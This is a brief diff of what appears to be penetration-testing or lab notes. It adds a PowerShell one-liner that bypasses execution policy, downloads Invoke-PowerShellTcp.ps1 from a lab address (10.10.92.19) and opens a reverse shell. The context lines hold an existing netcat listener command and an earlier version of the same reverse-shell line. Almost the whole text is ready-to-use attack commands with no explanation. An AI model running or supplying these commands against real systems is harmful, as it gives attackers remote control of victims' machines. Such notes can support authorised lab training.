@@ -17,6 +17,7 @@ nc -lvp 4445 : listener
 
 powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://10.10.121.196:8888/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 10.10.121.196 -Port 4445"
 
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.92.19:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.92.19 -Port 4444
 
 
 # Privilege elevation
